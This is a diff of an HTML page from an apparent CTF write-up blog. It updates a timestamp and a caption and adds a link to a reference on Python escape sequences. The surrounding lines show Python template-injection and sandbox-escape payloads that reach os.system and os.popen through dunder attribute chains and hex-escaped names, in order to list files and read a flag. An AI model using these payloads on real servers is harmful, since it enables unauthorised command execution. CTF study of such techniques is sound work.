@@ -56,7 +56,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/06/FmYOAgdIZWf6iJ5.png">
 <meta property="article:published_time" content="2020-02-24T01:11:15.000Z">
-<meta property="article:modified_time" content="2020-03-25T08:07:18.792Z">
+<meta property="article:modified_time" content="2020-03-29T13:25:04.004Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -394,7 +394,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
 
 <p>赛后看到下面两个payload</p>
-<p>payload1，利用16进制编码</p>
+<p>payload1，利用转义字符（16进制）</p>
+<blockquote>
+<p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p>
+</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>payload2，利用request</p>
